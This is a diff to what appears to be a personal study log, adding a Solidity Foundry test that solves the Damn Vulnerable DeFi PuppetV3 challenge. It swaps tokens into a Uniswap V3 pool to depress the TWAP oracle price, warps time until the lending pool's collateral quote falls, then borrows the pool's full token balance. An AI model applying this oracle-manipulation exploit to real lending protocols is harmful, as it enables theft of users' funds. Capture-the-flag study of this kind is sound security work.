@@ -448,6 +448,40 @@ contract PuppetV2Exploit {
     
 }
 ```
+### 2024.09.04
 
+- Damn Vulnerable DeFi: PuppetV3
+
+#### PuppetV3
+```solidity
+    function test_puppetV3() public checkSolvedByPlayer {
+        ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+        token.approve(address(router), type(uint256).max);
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token),
+                address(weth),
+                FEE,
+                address(player),
+                block.timestamp + 1,
+                PLAYER_INITIAL_TOKEN_BALANCE, 
+                0,
+                0
+            )
+        );
+
+        while(true){
+            vm.warp(block.timestamp + 10);
+            uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+            if(quote <= weth.balanceOf(player)) break;
+        }
+
+        console.log("Time: ", block.timestamp);
+        weth.approve(address(lendingPool), type(uint256).max);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);   
+
+    }
+```
 
 <!-- Content_END -->
